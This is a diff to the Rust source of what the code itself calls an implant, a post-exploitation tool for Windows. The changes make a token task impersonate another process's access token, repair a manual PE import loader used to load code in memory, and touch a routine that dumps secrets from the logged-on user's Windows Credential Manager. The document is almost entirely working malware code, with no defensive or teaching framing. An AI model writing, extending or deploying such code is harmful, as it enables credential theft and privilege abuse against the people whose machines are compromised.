@@ -46,10 +46,25 @@ pub fn inject(_pid: u32, mode: &str, _payload: &[u8]) -> Result<Outcome, String>
 }
 
 /// Duplicate and impersonate the access token of a process.
+///
+/// A duplicated token is only worth anything once it is in effect, so the
+/// task does the impersonation and answers with the identity the implant
+/// now runs as.  It goes through `impersonate`, not through the platform
+/// module, so the state that `restore` gives back is kept.
 #[cfg(windows)]
 pub fn token(pid: Option<u32>) -> Result<Outcome, String> {
-    use crate::post::windows as win;
-    win::duplicate_token(pid)
+    let pid = match pid {
+        Some(pid) => pid,
+        None => return Err("post: the token task needs args.pid".to_string()),
+    };
+    let identity = impersonate(pid, false)?;
+    Ok(Outcome {
+        report: format!(
+            "post.token: the implant is {} (session {}, from {} pid {})\n",
+            identity.account, identity.session, identity.process, identity.pid
+        ),
+        material: Vec::new(),
+    })
 }
 
 #[cfg(not(windows))]
@@ -280,6 +295,7 @@ pub mod windows {
     pub const TOKEN_SESSION_ID: u32 = 12;
 
     #[repr(C)]
+    #[derive(Clone, Copy)]
     pub struct Luid {
         low: u32,
         high: i32,
@@ -731,7 +747,7 @@ pub mod windows {
         let width = if pe.pe32_plus { 8 } else { 4 };
         for import in &pe.imports {
             let mut dll = import.dll.clone();
-            dll.push(0);
+            dll.push('\0');
             let mut module = unsafe { GetModuleHandleA(dll.as_ptr() as *const c_char) };
             if module.is_null() {
                 module = unsafe { LoadLibraryA(dll.as_ptr() as *const c_char) };
@@ -742,10 +758,13 @@ pub mod windows {
             }
             for (index, (name, ordinal)) in import.functions.iter().enumerate() {
                 let address = if name.is_empty() {
-                    unsafe { GetProcAddress(module, ordinal as *const c_char) }
+                    // An ordinal is passed where the name would be: the
+                    // low word of the address, which is why the cast goes
+                    // through usize and not through a pointer to u16.
+                    unsafe { GetProcAddress(module, (*ordinal as usize) as *const c_char) }
                 } else {
                     let mut cname = name.clone();
-                    cname.push(0);
+                    cname.push('\0');
                     unsafe { GetProcAddress(module, cname.as_ptr() as *const c_char) }
                 };
                 if address.is_null() {
@@ -828,7 +847,9 @@ pub mod windows {
             }
             let name = unsafe { wide_string((*entry).target_name) };
             let user = unsafe { wide_string((*entry).user_name) };
-            let kind = match (*entry).type_ {
+            // `entry` comes from CredEnumerateW: the pointer is valid
+            // until CredFree, and the fields are read here.
+            let kind = match unsafe { (*entry).type_ } {
                 CRED_TYPE_DOMAIN_PASSWORD => crate::creds::KIND_PASSWORD,
                 _ => crate::creds::KIND_TOKEN,
             };
@@ -837,8 +858,8 @@ pub mod windows {
                 .with_target(&name)
                 .with_confidence(85)
                 .with_note("the credential store of the logged on user");
-            let blob = (*entry).credential_blob;
-            let blob_size = (*entry).credential_blob_size as usize;
+            let blob = unsafe { (*entry).credential_blob };
+            let blob_size = unsafe { (*entry).credential_blob_size } as usize;
             if !blob.is_null() && blob_size > 0 {
                 let bytes = unsafe { std::slice::from_raw_parts(blob, blob_size) };
                 credential = credential.with_bytes(bytes);
@@ -1568,7 +1589,7 @@ pub mod pe {
         if rva == 0 {
             return Ok(out);
         }
-        let offset = rva;
+        let mut offset = rva;
         loop {
             if offset + 20 > data.len() {
                 return Err("post: the import table is truncated".to_string());
